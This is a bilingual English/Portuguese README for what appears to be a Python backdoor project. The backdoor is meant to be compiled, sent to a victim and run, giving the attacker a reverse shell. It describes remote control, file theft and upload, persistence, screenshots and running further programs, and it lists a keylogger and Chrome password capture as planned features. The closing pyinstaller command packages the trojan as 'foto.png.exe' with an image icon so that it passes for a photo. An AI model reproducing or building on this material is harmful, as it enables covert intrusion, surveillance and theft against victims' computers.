# Backdoor --- ALMOST READY

[US]
In this repository contains two programs. A backdoor and the user's interface.
the backdoor need to be compiled sent to the victim and executed.



# What's a backdoor ?
Backdoor is a computer virus popular known as trojan horse. It work's as a reverse shell to victim computer.



# How to use ? 
 
    First the victim should run the backdoor compiled in the computer. 
    Then when the attacker run the servidor.py he shall get a reverse connection to the victim comuter.
 
 # Uses 
     It can be used to control the victim computer with de reverse shell.
     Also you can send and download files to the victim computer
     Get persistence -> Even if the victim shutdown the computer, the backdoor will continue working.
     Execute other programs or virus in the victims computer.
     
     
# Backdoor features : 
- [x] Remote connection.
- [x] Download files from the victim machine.
- [x] Send files to victim machine.
- [x] Persistence.
- [x] Screenshot of the victim screen.
- [x] Execute other programs in the victim computer.
- [ ] Keylogger.
- [ ] Capture Google-chrome passwords.
- [ ] Geographic Location.
- [ ] Change victim's computer background.
- [ ] Backdoor complete (Only when all features ready).

================================================================================================= 


[BR]
# O que é uma Backdoor?
Backdoor ou popularmente conhecido como cavalo de tróia, é um tipo de vírus que ao infectar um computador, abre uma porta para o atacante conectar-se ao computador da vítma.

# Objetivos:
- [x] Conexão remota.
- [x] Download arquivos da maquina infectada.
- [x] Upload de arquivos para maquina.
- [x] Persistencia.
- [x] Screenshot.
- [x] Executar outros programas na maquina da vitma.
- [ ] Keylogger
- [ ] Capturar senhas chrome.
- [ ] Localização geográfica.
- [ ] Trocar wallpaper do computador.
- [ ] Programa completo.

# Instalação
  ~$ sudo pip install -r requeriments.txt

# COMPILAR O BACKDOOR

    ~$ pyinstaller -F --clean -w backdoor.py -i icone.png -n foto.png.exe
